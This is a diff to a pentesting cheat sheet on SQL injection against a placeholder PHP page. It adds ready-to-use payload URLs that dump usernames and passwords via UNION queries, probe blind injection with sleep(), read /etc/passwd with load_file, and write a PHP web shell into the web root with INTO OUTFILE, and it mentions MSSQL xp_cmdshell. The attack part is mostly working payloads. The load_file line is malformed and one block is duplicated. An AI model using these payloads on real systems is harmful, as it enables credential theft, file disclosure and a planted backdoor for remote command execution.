@@ -199,7 +199,7 @@ http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 f
 
 http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'
 
-# Get content from the users-table. From columns name and password
+# Get content from the users-table. From columns name and password. The 0x3a only servers to create a delimitor between name and password
 
 http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a,
 password),6,7,8,9 FROM users
@@ -209,6 +209,48 @@ password),6,7,8,9 FROM users
 
 ### Blind sql-injection
 
-We say that it is blind becasue we do not have access to the error log. 
+We say that it is blind because we do not have access to the error log. This make the whole process a lot more complicated. But it is of course still possible to exploit.
+
+#### Using sleep
+
+Since we do not have access to the logs we do not know if our commands are syntaxically correct or not. To know if it is correct or not we can however use the sleep statement.
+
+```
+http://example.com/photoalbum.php?id=1-sleep(4)
+```
+
+If it lods for four seconds exta we know that the database is processing our sleep() command. 
+
+
+### Get shell from sql-injection
+
+The good part about mysql from a hacker-perspective is that you can actaully use slq to write files to the system. The will let us write a backdoor to the system that we can use.
+
+
+#### Load files
+
+UNION SELECT 1, load_file(/etc/passwd) #
+
+```
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+
+```
+#### Write files
+
+```
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+```
+
+#### MSSQL - xp_cmdshell
+
+You can run commands straight from the sql-query in MSSQL.
 
 ## References
+
+http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/
